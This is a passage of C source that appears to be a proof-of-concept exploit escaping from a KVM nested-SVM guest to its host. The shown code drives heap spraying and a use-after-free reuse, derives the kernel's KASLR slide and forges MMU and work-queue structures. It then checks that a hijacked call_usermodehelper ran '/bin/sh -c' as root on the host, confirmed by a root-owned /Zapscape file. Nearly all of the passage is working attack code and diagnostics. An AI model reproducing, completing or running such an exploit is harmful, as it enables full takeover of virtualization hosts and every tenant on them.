		.runsz = (size_t)runsz,
	};
	pthread_t trigger_thread;

	if (pthread_create(&spray_thread, NULL, run_sprayer, &sc))
		die("pthread_create BSP spray");
	if (pthread_create(&trigger_thread, NULL, run_smp_trigger, &tc))
		die("pthread_create AP trigger");
	smp_barrier_wait(&smp_start_barrier, "main start barrier");
	unsigned int smp_completed_mask = smp_wait_for_terminals();
	int eb = ((struct vmcb *)(M + G1_VMCB))->control.exit_code;

	printf("[TRIG] guest-only-dynamic: TERM port=%#x vmcb_exit=%#llx; successful-KVM_RUN-exits-through-TERM=%d EAGAIN-reentries=%d; exact-TERM-to-PARK=yes next-action=unconditional-KVM_RUN\n",
	       POC_TERM_PORT_MAIN, (unsigned long long)(unsigned int)eb,
	       smp_trigger_run_calls, smp_trigger_eagain_reentries);
	printf("[CLEAR] TERM port=%#x; successful-KVM_RUN-exits-through-TERM=%d; exact-TERM-to-PARK=yes next-action=unconditional-KVM_RUN\n",
	       POC_TERM_PORT_SPRAY, smp_spray_run_calls);
	struct dynamic_snapshot d = dynamic_snapshot();

	printf("[DYN] terminal-snapshot status=%c candidates=%u C=%#x page=%#x C-applied=%u expected=%u fixed-page-payload-relocs=0\n",
	       d.status ?: '.', d.scan_count, d.c_gpa, d.page_gpa, d.c_applied,
	       expected_c_relocs);
	printf("[TRIG-DYN] terminal-snapshot markers X=%c Y=%c leak=%c arm=%c F2=%c work=%c/%c/%c\n",
	       M[SPRAY_ARM + 7] ?: '.', M[SPRAY_ARM + 8] ?: '.',
	       M[SPRAY_ARM + 9] ?: '.', M[SPRAY_ARM + 10] ?: '.',
	       M[SPRAY_ARM + 13] ?: '.', M[SPRAY_ARM + 26] ?: '.',
	       M[SPRAY_ARM + 25] ?: '.', M[SPRAY_ARM + 24] ?: '.');
	printf("[POC-WAKE] x2apic/sent/ack=%c/%c/%c prefault=%c\n",
	       M[POC_WAKE_X2APIC] ?: '.', M[POC_WAKE_SENT] ?: '.',
	       M[POC_WAKE_ACK] ?: '.', M[SPRAY_ARM + 4] ?: '.');
	printf("[SMP-MP] INIT/SIPI/AP-entered=%c/%c/%c reset-boot=%s\n",
	       M[SMP_INIT_SENT] ?: '.', M[SMP_SIPI_SENT] ?: '.',
	       M[SMP_AP_ENTERED] ?: '.', "yes");
	printf("[KASLR-F] post-terminal passes arm/exit/repair/free=%u/%u/%u/%u mready=%c chash=%c qmax=%c/%c pg=%c eready=%c C.preE=%c track=%u/%u status=%c activation=%c splice=%c work=%c fail=%c N.gpa=%#x pay=%#x P=%#llx slide=%#x\n",
	       M[KS_PASS_ARM], M[KS_PASS_EXIT], M[KS_PASS_REPAIR],
	       M[KS_PASS_FREE], M[KS_M_READY] ?: '.',
	       M[KS_C_HASH_LINKED] ?: '.', M[KS_QMAX_ORACLE] ?: '.',
	       M[KS_QMAX_C_REPAIRED] ?: '.', M[KS_PAGING_OFF] ?: '.',
	       M[KS_E_READY] ?: '.', M[KS_C_PRE_E] ?: '.', M[KS_TRACK_REQ],
	       M[KS_TRACK_ACK], M[KS_STATUS] ?: '.',
	       M[KS_ACTIVATION_ARM] ?: '.', M[KS_SPLICE_READY] ?: '.',
	       M[KS_WORK_QUEUED] ?: '.', M[SPRAY_ARM + 48u] ?: '.',
	       *(uint32_t *)(M + KS_N_GPA), *(uint32_t *)(M + KS_PAY_GPA),
	       (unsigned long long)*(uint64_t *)(M + KS_P_LO),
	       *(uint32_t *)(M + KS_SLIDE));
	printf("[KASLR-F] derived log=%#llx srcu=%#llx umh=%#llx zero=%#llx raw-gpa0=%#llx pde5=%#x\n",
	       (unsigned long long)*(uint64_t *)(M + KS_LOG_LO),
	       (unsigned long long)*(uint64_t *)(M + KS_SRCU_LO),
	       (unsigned long long)*(uint64_t *)(M + KS_UMH_LO),
	       (unsigned long long)*(uint64_t *)(M + KS_ZERO_LO),
	       (unsigned long long)*(uint64_t *)(M + G1_PAE_PDPT),
	       *(uint32_t *)(M + 0x28u));
	uint32_t terminal_n = *(uint32_t *)(M + KS_N_GPA);

	if (terminal_n >= SPRAY2_START && terminal_n < SPRAY2_END &&
	    !(terminal_n & 0xfffu))
		printf("[KASLR-F] terminal-snapshot N markers +208=%#llx +300=%#llx\n",
		       (unsigned long long)*(uint64_t *)(M + terminal_n +
							 0x208u),
		       (unsigned long long)*(uint64_t *)(M + terminal_n +
							 0x300u));
	printf("[SHEAF-DYN] P-alloc=%c P-free=%c A-alloc=%c BC-alloc=%c B-free=%c A-free=%c C-free=%c\n",
	       M[SPRAY_ARM + 35] ?: '.', M[SPRAY_ARM + 36] ?: '.',
	       M[SPRAY_ARM + 37] ?: '.', M[SPRAY_ARM + 38] ?: '.',
	       M[SPRAY_ARM + 39] ?: '.', M[SPRAY_ARM + 40] ?: '.',
	       M[SPRAY_ARM + 41] ?: '.');
	printf("[SHEAF-DYN] VMRUN fail-stage=%c (expected .) exit=%#llx info=%#llx/%#llx\n",
	       M[SPRAY_ARM + 48] ?: '.',
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))
		       ->control.exit_code,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))
		       ->control.exit_info_1,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))
		       ->control.exit_info_2);
	printf("[SHEAF-DYN] L2 state rip=%#llx rax=%#llx cr0=%#llx cr3=%#llx cr4=%#llx efer=%#llx ncr3=%#llx\n",
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))->save.rip,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))->save.rax,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))->save.cr0,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))->save.cr3,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))->save.cr4,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))->save.efer,
	       (unsigned long long)((struct vmcb *)(M + G1_VMCB))
		       ->control.nested_cr3);
	printf("[SHEAF-DYN] raw P NPT pae=%#llx/%#llx/%#llx/%#llx pml4=%#llx pdpt=%#llx/%#llx/%#llx/%#llx pd=%#llx/%#llx/%#llx pt0=%#llx/%#llx/%#llx\n",
	       (unsigned long long)*(uint64_t *)(M + NPT_PAE + 0u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PAE + 8u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PAE + 16u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PAE + 24u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PML4),
	       (unsigned long long)*(uint64_t *)(M + NPT_PDPT + 0u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PDPT + 8u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PDPT + 16u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PDPT + 24u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PD + 0u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PD + 8u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PD + 16u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PT0 + 0u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PT0 + 8u),
	       (unsigned long long)*(uint64_t *)(M + NPT_PT0 + 16u));
	printf("[SHEAF-DYN] P payload bytes:");
	for (unsigned int i = 0; i < 48; i++)
		printf("%s%02x", i % 16 ? " " : "\n  ",
		       M[POST_L2_CODE + 0x400u + i]);
	printf("\n");
	fflush(stdout);
	bool dyn_valid = dynamic_snapshot_valid(&d);
	struct stat zap_post;

	memset(&zap_post, 0, sizeof(zap_post));
	bool zapscape_seen = lstat("/Zapscape", &zap_post) == 0;
	int zap_post_errno = zapscape_seen ? 0 : errno;
	uint64_t saved_n = *(uint64_t *)(M + G1_MARKER + 32);
	uint64_t saved_h = *(uint64_t *)(M + G1_MARKER + 40);
	uint64_t initial_c_next = *(uint64_t *)(M + G1_MARKER + 48);
	uint64_t predecessor_m = *(uint64_t *)(M + G1_MARKER + 56);
	uint64_t first_nx = *(uint64_t *)(M + G1_MARKER + 64);
	uint64_t first_nx_prev = *(uint64_t *)(M + G1_MARKER + 72);
	uint64_t second_nx = *(uint64_t *)(M + G1_MARKER + 80);
	uint64_t second_nx_prev = *(uint64_t *)(M + G1_MARKER + 88);
	struct vmcb *post_v = (struct vmcb *)(M + H_G1_VMCB);
	uint64_t final_next = dyn_read64(dyn_valid, d.c_gpa, 0);
	uint64_t final_prev = dyn_read64(dyn_valid, d.c_gpa, 8);
	uint32_t final_flags = dyn_read32(dyn_valid, d.c_gpa, 32);
	uint32_t final_role = dyn_read32(dyn_valid, d.c_gpa, 36);
	uint64_t final_spt = dyn_read64(dyn_valid, d.c_gpa, 48);
	uint32_t final_root = dyn_read32(dyn_valid, d.c_gpa, 64);
	uint64_t final_parent = dyn_read64(dyn_valid, d.c_gpa, 80);
	uint64_t final_possible_next = dyn_read64(dyn_valid, d.c_gpa, 152);
	uint64_t final_possible_prev = dyn_read64(dyn_valid, d.c_gpa, 160);
	uint32_t host_payload_gpa = *(uint32_t *)(M + KS_PAY_GPA);
	uint32_t host_payload_extent = KHP_SIZE;
	bool host_payload_valid =
		dyn_valid &&
		(uint64_t)host_payload_gpa + host_payload_extent <= MEMSZ;
	uint64_t w_data = dyn_read64(host_payload_valid, host_payload_gpa, 40u);
	uint32_t q1_n_gpa = *(uint32_t *)(M + POC_Q1_N_GPA);
	bool q1_n_valid = q1_n_gpa >= SPRAY2_START && q1_n_gpa < SPRAY2_END &&
			  !(q1_n_gpa & 0xfffu);
	bool q1_handshake_gate =
		M[POC_Q1_ARMED] == 'A' && M[POC_Q1_SEEN] == 'S' &&
		M[POC_Q1_CLEARED] == 'Z' && M[POC_Q1_MATCHED] == 'N' &&
		!M[POC_Q1_FAIL] && q1_n_valid;
	q1_handshake_gate = q1_handshake_gate &&
			    q1_n_gpa == *(uint32_t *)(M + KS_N_GPA);
	bool monitor_gate = M[POC_MONITOR_ENTERED] == 'M' &&
			    M[POC_MONITOR_RETURNED] == 'R';
	bool icr_gate = M[POC_ACT_PREFLIGHT] == 'D' &&
			M[POC_ACT_ARMED] == 'I' && M[POC_ACT_DONE] == 'P' &&
			!M[POC_ACT_FAIL];
	bool activation_gate = monitor_gate && icr_gate;

	printf("[DYN] guest relocation gate=%s status=%c candidates=%u C=%#x page=%#x C.off=%#x C-applied=%u fixed-page-payload-relocs=0\n",
	       dyn_valid ? "PASS" : "FAIL", d.status ?: '.', d.scan_count,
	       d.c_gpa, d.page_gpa, d.c_gpa & 0xfffu, d.c_applied);
	printf("[CROSS-DYN] saved N=%#llx H=%#llx initial-next=%#llx predecessor=%#llx final-link=%#llx/%#llx\n",
	       (unsigned long long)saved_n, (unsigned long long)saved_h,
	       (unsigned long long)initial_c_next,
	       (unsigned long long)predecessor_m,
	       (unsigned long long)final_next, (unsigned long long)final_prev);
	printf("[REP-DYN] nx=%#llx/%#llx second=%#llx/%#llx flags/role=%#x/%#x spt=%#llx root=%u parent=%#llx possible=%#llx/%#llx payload=%#x W.data=%#llx\n",
	       (unsigned long long)first_nx, (unsigned long long)first_nx_prev,
	       (unsigned long long)second_nx,
	       (unsigned long long)second_nx_prev, final_flags, final_role,
	       (unsigned long long)final_spt, final_root,
	       (unsigned long long)final_parent,
	       (unsigned long long)final_possible_next,
	       (unsigned long long)final_possible_prev, host_payload_gpa,
	       (unsigned long long)w_data);
	printf("[POC-Q1] armed/seen/cleared/matched/fail=%c/%c/%c/%c/%c early-N=%#x oracle-N=%#x gate=%s\n",
	       M[POC_Q1_ARMED] ?: '.', M[POC_Q1_SEEN] ?: '.',
	       M[POC_Q1_CLEARED] ?: '.', M[POC_Q1_MATCHED] ?: '.',
	       M[POC_Q1_FAIL] ?: '.', q1_n_gpa, *(uint32_t *)(M + KS_N_GPA),
	       q1_handshake_gate ? "PASS" : "FAIL");
	printf("[POC-ACT] phase entered/returned=%c/%c gate=%s opcode=%s ICR preflight/armed/done/fail=%c/%c/%c/%c value=%#x gate=%s combined=%s\n",
	       M[POC_MONITOR_ENTERED] ?: '.', M[POC_MONITOR_RETURNED] ?: '.',
	       monitor_gate ? "PASS" : "FAIL", "MONITOR",
	       M[POC_ACT_PREFLIGHT] ?: '.', M[POC_ACT_ARMED] ?: '.',
	       M[POC_ACT_DONE] ?: '.', M[POC_ACT_FAIL] ?: '.', POC_ACT_ICR_LOW,
	       icr_gate ? "PASS" : "FAIL", activation_gate ? "PASS" : "FAIL");
	bool final_state_gate;

	final_state_gate =
		final_flags == 1u && final_role == TARGET_ROLE_INVALID &&
		final_spt == *(uint64_t *)(M + KS_ZERO_LO) && final_root == 1 &&
		!final_parent && final_possible_next == first_nx &&
		final_possible_prev == first_nx;
	bool spray_completion_gate;

	spray_completion_gate = (smp_completed_mask & 2u) != 0;
	bool wake_gate = M[POC_WAKE_X2APIC] == 'X' && M[POC_WAKE_ACK] == 'W';

	wake_gate = wake_gate && M[POC_WAKE_SENT] == 'S' &&
		    M[SMP_INIT_SENT] == 'I' && M[SMP_SIPI_SENT] == 'S' &&
		    M[SMP_AP_ENTERED] == 'A';
	bool trigger_gate =
		dyn_valid && q1_handshake_gate && activation_gate &&
		wake_gate && M[SPRAY_ARM + 5] == 'F' &&
		M[SPRAY_ARM + 6] == '1' && M[SPRAY_ARM + 7] == 'X' &&
		M[SPRAY_ARM + 8] == 'Y' && M[SPRAY_ARM + 9] == 'L' &&
		M[SPRAY_ARM + 10] == 'R' && M[SPRAY_ARM + 11] == 'V' &&
		M[SPRAY_ARM + 12] == 'Z' && M[SPRAY_ARM + 13] == 'F' &&
		M[G1_MARKER + 3] == 'H' && post_v->control.exit_code == 0x81 &&
		(smp_completed_mask & 1u) && spray_completion_gate &&
		initial_c_next == 0 &&
		(saved_n & 0xffff000000000000ull) == 0xffff000000000000ull &&
		(saved_h & 0xffff000000000000ull) == 0xffff000000000000ull &&
		(predecessor_m & 0xffff000000000000ull) ==
			0xffff000000000000ull &&
		final_state_gate;
	printf("[CROSS-DYN] trigger/reuse guest gate=%s\n",
	       trigger_gate ? "PASS" : "FAIL");
	bool rep_gate = M[SPRAY_ARM + 15] == 'M' && M[SPRAY_ARM + 16] == 'A' &&
			M[SPRAY_ARM + 17] == 'B' && M[SPRAY_ARM + 18] == 'L' &&
			M[SPRAY_ARM + 19] == 'R' && M[SPRAY_ARM + 21] == '2' &&
			M[SPRAY_ARM + 22] == 'S' && M[SPRAY_ARM + 23] == 'r' &&
			M[SPRAY_ARM + 20] == 'P' && trigger_gate &&
			(first_nx & 0xffff000000000000ull) ==
				0xffff000000000000ull &&
			first_nx == first_nx_prev && first_nx == second_nx &&
			second_nx == second_nx_prev && final_state_gate;
	printf("[REP-DYN] repeat fake-C gate=%s\n", rep_gate ? "PASS" : "FAIL");
	printf("[HOST-DYN] activation/work=%c /Zapscape seen=%s uid=%u mode=%#o errno=%d\n",
	       M[SPRAY_ARM + 24] ?: '.', zapscape_seen ? "YES" : "NO",
	       zapscape_seen ? (unsigned int)zap_post.st_uid : (unsigned int)-1,
	       zapscape_seen ? (unsigned int)zap_post.st_mode : 0u,
	       zapscape_seen ? 0 : zap_post_errno);
	const char *terminal_mode = "host-effect";
	uint32_t kaslr_n_gpa = *(uint32_t *)(M + KS_N_GPA);
	uint32_t kaslr_slide = *(uint32_t *)(M + KS_SLIDE);
	uint64_t kaslr_k = *(uint64_t *)(M + KS_K_LO);
	uint64_t kaslr_f = *(uint64_t *)(M + KS_F_LO);
	uint64_t kaslr_p = *(uint64_t *)(M + KS_P_LO);
	uint64_t kaslr_log = *(uint64_t *)(M + KS_LOG_LO);
	uint64_t kaslr_srcu = *(uint64_t *)(M + KS_SRCU_LO);
	uint64_t kaslr_umh = *(uint64_t *)(M + KS_UMH_LO);
	uint64_t kaslr_zero = *(uint64_t *)(M + KS_ZERO_LO);
	uint64_t kaslr_work_noop = *(uint64_t *)(M + KS_WORK_NOOP_LO);
	uint64_t kaslr_ep_autoremove = *(uint64_t *)(M + KS_EP_AUTOREMOVE_LO);
	uint64_t kaslr_init_task = *(uint64_t *)(M + KS_INIT_TASK_LO);
	uint32_t kaslr_pay_gpa = *(uint32_t *)(M + KS_PAY_GPA);
	uint64_t kaslr_pay_hva = *(uint64_t *)(M + KS_PAY_HVA_LO);
	uint64_t payload_func =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_W + 24u);
	uint64_t payload_complete =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_W + 32u);
	uint64_t payload_f_private =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_F + 8u);
	uint64_t payload_f_func =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_F + 16u);
	uint64_t payload_path =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_W + 40u);
	uint64_t payload_argv =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_W + 48u);
	uint64_t payload_envp =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_W + 56u);
	uint32_t payload_wait =
		dyn_read32(host_payload_valid, kaslr_pay_gpa, KHP_W + 64u);
	uint64_t payload_argv0 =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_ARGV + 0u);
	uint64_t payload_argv1 =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_ARGV + 8u);
	uint64_t payload_argv2 =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_ARGV + 16u);
	uint64_t payload_argv3 =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_ARGV + 24u);
	uint64_t payload_env0 =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_ENVP);
	uint32_t payload_completion_done = dyn_read32(
		host_payload_valid, kaslr_pay_gpa, KHP_COMPLETE + 0u);
	uint32_t payload_completion_owner = dyn_read32(
		host_payload_valid, kaslr_pay_gpa, KHP_COMPLETE + 4u);
	uint32_t payload_completion_lock = dyn_read32(
		host_payload_valid, kaslr_pay_gpa, KHP_COMPLETE + 8u);
	uint64_t payload_completion_next = dyn_read64(
		host_payload_valid, kaslr_pay_gpa, KHP_COMPLETE + 16u);
	uint64_t payload_completion_prev = dyn_read64(
		host_payload_valid, kaslr_pay_gpa, KHP_COMPLETE + 24u);
	uint32_t payload_retval =
		dyn_read32(host_payload_valid, kaslr_pay_gpa, KHP_W + 68u);
	bool payload_completion_post_gate;
	bool payload_live_pointer_gate;

	payload_completion_post_gate =
		!payload_complete && payload_completion_done == 1u &&
		(payload_completion_owner == 'A' ||
		 payload_completion_owner == 'B') &&
		!payload_completion_lock && !payload_retval &&
		M[KS_DISARM_STATUS] == 'D' && M[KS_UNLINK_ARM] == 'U' &&
		M[KS_UNLINK_ICR] == 'I' && M[KS_UNLINK_DONE] == 'X' &&
		M[KS_UMH_COMPLETE] == 'E';
	payload_live_pointer_gate = payload_func == kaslr_work_noop &&
				    payload_f_private == kaslr_init_task &&
				    payload_f_func == kaslr_ep_autoremove;
	bool payload_layout_gate =
		host_payload_valid && payload_live_pointer_gate &&
		payload_completion_post_gate &&
		payload_completion_next == kaslr_pay_hva + KHP_COMPLETE + 16u &&
		payload_completion_prev == kaslr_pay_hva + KHP_COMPLETE + 16u &&
		payload_path == kaslr_pay_hva + KHP_PATH &&
		payload_argv == kaslr_pay_hva + KHP_ARGV &&
		payload_envp == kaslr_pay_hva + KHP_ENVP &&
		payload_wait == 2u &&
		payload_argv0 == kaslr_pay_hva + KHP_ARG0 &&
		payload_argv1 == kaslr_pay_hva + KHP_ARG1 &&
		payload_argv2 == kaslr_pay_hva + KHP_SCRIPT && !payload_argv3 &&
		!payload_env0 &&
		!memcmp(M + kaslr_pay_gpa + KHP_PATH, "/bin/sh",
			sizeof("/bin/sh")) &&
		!memcmp(M + kaslr_pay_gpa + KHP_ARG0, "sh", sizeof("sh")) &&
		!memcmp(M + kaslr_pay_gpa + KHP_ARG1, "-c", sizeof("-c")) &&
		!memcmp(M + kaslr_pay_gpa + KHP_SCRIPT, KHP_SCRIPT_TEXT,
			sizeof(KHP_SCRIPT_TEXT));
	bool kaslr_n_valid = kaslr_n_gpa >= SPRAY2_START &&
			     kaslr_n_gpa < SPRAY2_END &&
			     !(kaslr_n_gpa & 0xfffu);
	bool kaslr_n_lineage = kaslr_n_valid && kaslr_pay_gpa == kaslr_n_gpa &&
			       kaslr_pay_hva == (saved_n & ~0xfffull) &&
			       !*(uint64_t *)(M + kaslr_n_gpa + 0x300u);
	unsigned int expected_track = 4u;
	bool kaslr_chain_gate =
		rep_gate && M[KS_STATUS] == 'S' && M[KS_M_READY] == 'R' &&
		M[KS_E_READY] == 'E' && M[KS_C_HASH_LINKED] == 'J' &&
		M[KS_QMAX_ORACLE] == 'O' && M[KS_QMAX_C_REPAIRED] == 'C' &&
		M[KS_PAGING_OFF] == 'U' && M[KS_C_PRE_E] == 'R' &&
		M[KS_PASS_ARM] == 8 && M[KS_PASS_EXIT] == 8 &&
		M[KS_PASS_REPAIR] == 8 && M[KS_PASS_FREE] == 8 &&
		M[KS_TRACK_REQ] == expected_track &&
		M[KS_TRACK_ACK] == expected_track && !M[SPRAY_ARM + 48u] &&
		kaslr_n_lineage &&
		(kaslr_k & 0xffff000000000000ull) == 0xffff000000000000ull &&
		kaslr_f == kaslr_k + KVM_PM_NOTIFIER_OFF &&
		saved_h == kaslr_k + KVM_ACTIVE_HEAD_OFF &&
		*(uint32_t *)(M + KS_P_HI) == 0xffffffffu &&
		kaslr_slide < KASLR_IMAGE_MAX && !(kaslr_slide & 0x1fffffu) &&
		kaslr_p == RCU_PM_NB_LINK + kaslr_slide &&
		kaslr_log == LOG_WAIT_HEAD + kaslr_slide &&
		kaslr_srcu == SRCU_DELAY_TIMER + kaslr_slide &&
		kaslr_umh == CALL_USERMODEHELPER_EXEC_WORK + kaslr_slide &&
		kaslr_zero == EMPTY_ZERO_PAGE + kaslr_slide &&
		*(uint64_t *)(M + G1_PAE_PDPT) ==
			((uint64_t)G1_PAE_PD | 0x21u) &&
		*(uint32_t *)(M + 0x28u) == 0xa7u;
	kaslr_chain_gate = kaslr_chain_gate &&
			   kaslr_work_noop == WORKQUEUE_NOOP + kaslr_slide &&
			   kaslr_ep_autoremove ==
				   EP_AUTOREMOVE_WAKE + kaslr_slide &&
			   kaslr_init_task == INIT_TASK_SYMBOL + kaslr_slide;
	printf("[KASLR-F] Q1-Q8/C-hash/N-oracle/slide gate=%s K=%#llx F=%#llx N.gpa=%#x P=%#llx slide=%#x N.lineage=%s\n",
	       kaslr_chain_gate ? "PASS" : "FAIL", (unsigned long long)kaslr_k,
	       (unsigned long long)kaslr_f, kaslr_n_gpa,
	       (unsigned long long)kaslr_p, kaslr_slide,
	       kaslr_n_lineage ? "YES" : "NO");
	printf("[KASLR-F] derived-symbol gate log=%#llx srcu=%#llx umh=%#llx zero=%#llx noop=%#llx ep-auto=%#llx init-task=%#llx raw-gpa0=%#llx pde5=%#x\n",
	       (unsigned long long)kaslr_log, (unsigned long long)kaslr_srcu,
	       (unsigned long long)kaslr_umh, (unsigned long long)kaslr_zero,
	       (unsigned long long)kaslr_work_noop,
	       (unsigned long long)kaslr_ep_autoremove,
	       (unsigned long long)kaslr_init_task,
	       (unsigned long long)*(uint64_t *)(M + G1_PAE_PDPT),
	       *(uint32_t *)(M + 0x28u));
	uint64_t expected_head = kaslr_log;
	uint64_t expected_entry = kaslr_pay_hva + KHP_F + 24u;
	uint64_t f_next =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_F + 24u);
	uint64_t f_prev =
		dyn_read64(host_payload_valid, kaslr_pay_gpa, KHP_F + 32u);
	bool durable_splice_gate =
		kaslr_chain_gate && payload_layout_gate &&
		final_spt == kaslr_zero && M[KS_ACTIVATION_ARM] == 'A' &&
		M[KS_SPLICE_READY] == 'L' && M[SPRAY_ARM + 26] == 'I' &&
		final_flags == 1u && final_role == TARGET_ROLE_INVALID &&
		final_root == 1 && !final_parent &&
		final_possible_next == first_nx &&
		final_possible_prev == first_nx;
	bool live_f_links;

	live_f_links = f_next == expected_entry && f_prev == expected_entry;
	bool splice_gate = durable_splice_gate && live_f_links;

	printf("[KASLR-C] payload=%#x/%#llx layout=%s completion.ptr/done/owner/lock/retval=%#llx/%u/%c/%#x/%#x F.private/func=%#llx/%#llx lifecycle=%c/%c/%c/%c/%c C.spt=%#llx/%#llx C.possible=%#llx/%#llx live-F.entry=%#llx/%#llx expected-head/entry=%#llx/%#llx live-F-match=%s preactivation-guest=%c/%c role/root/parent=%#x/%u/%#llx splice=%s\n",
	       kaslr_pay_gpa, (unsigned long long)kaslr_pay_hva,
	       payload_layout_gate ? "PASS" : "FAIL",
	       (unsigned long long)payload_complete, payload_completion_done,
	       payload_completion_owner ? (char)payload_completion_owner : '.',
	       payload_completion_lock, payload_retval,
	       (unsigned long long)payload_f_private,
	       (unsigned long long)payload_f_func, M[KS_DISARM_STATUS] ?: '.',
	       M[KS_UNLINK_ARM] ?: '.', M[KS_UNLINK_ICR] ?: '.',
	       M[KS_UNLINK_DONE] ?: '.', M[KS_UMH_COMPLETE] ?: '.',
	       (unsigned long long)final_spt, (unsigned long long)kaslr_zero,
	       (unsigned long long)final_possible_next,
	       (unsigned long long)final_possible_prev,
	       (unsigned long long)f_next, (unsigned long long)f_prev,
	       (unsigned long long)expected_head,
	       (unsigned long long)expected_entry, live_f_links ? "YES" : "NO",
	       M[KS_SPLICE_READY] ?: '.', M[SPRAY_ARM + 26] ?: '.', final_role,
	       final_root, (unsigned long long)final_parent,
	       splice_gate ? "PASS" : "FAIL");
	bool host_effect_gate =
		splice_gate && M[KS_WORK_QUEUED] == 'Q' &&
		M[SPRAY_ARM + 25] == 'Q' && M[KS_UMH_COMPLETE] == 'E' &&
		M[SPRAY_ARM + 24] == 'W' && zapscape_seen &&
		zap_post.st_uid == 0 &&
		(zap_post.st_mode & (S_IFMT | 07777)) == (S_IFREG | 0644);
	printf("[KASLR-HOST] activation-sequence=%s activation/work/lifetime=/Zapscape=%c/%c/%c%c%c%c%c/%s uid=%u W.data=%#llx guest-only host-effect gate=%s\n",
	       "MONITOR->LOWEST-ICR", M[SPRAY_ARM + 24] ?: '.',
	       M[KS_WORK_QUEUED] ?: '.', M[KS_DISARM_STATUS] ?: '.',
	       M[KS_UNLINK_ARM] ?: '.', M[KS_UNLINK_ICR] ?: '.',
	       M[KS_UNLINK_DONE] ?: '.', M[KS_UMH_COMPLETE] ?: '.',
	       zapscape_seen ? "YES" : "NO",
	       zapscape_seen ? (unsigned int)zap_post.st_uid : (unsigned int)-1,
	       (unsigned long long)w_data, host_effect_gate ? "PASS" : "FAIL");
	printf("[TRIG-DYN] result combined=%#x\n", eb);
	bool terminal_output_flushed = fflush(stdout) == 0 && !ferror(stdout);

	if (!terminal_output_flushed)
		perror("terminal result fflush");
	if (M[SPRAY_ARM + 7] == 'X') {
		bool frontend_pass_gate = dyn_valid && rep_gate &&
					  host_effect_gate;
		int park_printed = printf(
			"[PARK-DYN] preserving live VM after P1 (reloc=%s rep=%s mode=%s gate=%s)\n",
			dyn_valid ? "PASS" : "FAIL", rep_gate ? "PASS" : "FAIL",
			terminal_mode, host_effect_gate ? "PASS" : "FAIL");
		bool park_output_flushed = park_printed >= 0 &&
					   fflush(stdout) == 0 &&
					   !ferror(stdout);
		if (!park_output_flushed)
			perror("PARK fflush");
		if (frontend_pass_gate && terminal_output_flushed &&
		    park_output_flushed)
			notify_frontend_pass(notify_fd);
		for (;;)
			pause();
	}
	return 0;
}

int main(void)
{
	int notify_pipe[2];

	if (pipe2(notify_pipe, O_CLOEXEC))
		die("pipe2 frontend notification");
	pid_t child = fork();

	if (child < 0)
		die("fork VM-owning child");
	if (child > 0) {
		(void)close(notify_pipe[1]);
		int parent_result = wait_for_child_pass(notify_pipe[0], child);

		_exit(parent_result ? EXIT_FAILURE : EXIT_SUCCESS);
	}
	(void)close(notify_pipe[0]);
	struct sigaction ignore_sigpipe = { 0 };

	ignore_sigpipe.sa_handler = SIG_IGN;
	if (sigemptyset(&ignore_sigpipe.sa_mask) ||
	    sigaction(SIGPIPE, &ignore_sigpipe, NULL))
		die("ignore SIGPIPE in VM-owning child");
	int child_result = run_poc_child(notify_pipe[1]);
	(void)close(notify_pipe[1]);
	_exit(child_result ? EXIT_FAILURE : EXIT_SUCCESS);
}

#define KASLR_POST_HASH(gfn) \
	((((uint64_t)(gfn) * UINT64_C(0x61c8864680b583eb))) >> (64u - 12u))
_Static_assert(!(POST_NPT_PML4 & 0xfffu), "POST root must be page aligned");
_Static_assert(POST_NPT_PML4 >= SPRAY2_END,
	       "POST root must survive the guest-zeroed Stage2 oracle range");
_Static_assert(POST_NPT_PML4 + 0x1000u <= 518u * 1024u * 1024u,
	       "POST root exceeds the fixed demo memslot");
_Static_assert(KASLR_POST_HASH(POST_NPT_PML4 >> 12) == 0,
	       "POST root M must hash into KVM MMU bucket zero");
_Static_assert(POST_L2_CODE + 0x1000u <= H_GPA_BASE,
	       "low H/G layout overlaps conveyor payloads");
_Static_assert(G_P1_L2_CODE + 0x1000u <= NPT_PT_POOL,
	       "low H/G layout overlaps the primary NPT PT pool");
_Static_assert(DRAIN_LEAVES <= 510,
	       "initial drain exceeds G's single level-2 page");
_Static_assert(852 <= H_LEAVES, "A exceeds H's preinitialized raw PT pool");
_Static_assert(1225 <= NPT_MAP_MAX,
	       "B/C exceed the primary preinitialized raw PT pool");
